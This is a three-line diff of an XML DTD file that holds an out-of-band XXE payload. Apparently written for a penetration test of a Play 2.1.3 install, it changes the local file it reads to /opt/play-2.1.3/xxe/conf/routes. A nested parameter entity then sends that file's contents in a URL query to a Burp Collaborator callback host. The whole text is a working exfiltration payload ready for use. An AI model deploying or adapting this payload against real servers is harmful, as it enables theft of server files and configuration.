@@ -1,3 +1,3 @@
-<!ENTITY % p1 SYSTEM "file:///opt/play-2.1.3/xxe">
+<!ENTITY % p1 SYSTEM "file:///opt/play-2.1.3/xxe/conf/routes">
 <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://mf5dhymb517s9ha6go7gf6k9c0iq6f.burpcollaborator.net/passwd?%p1;'>">
 %p2;
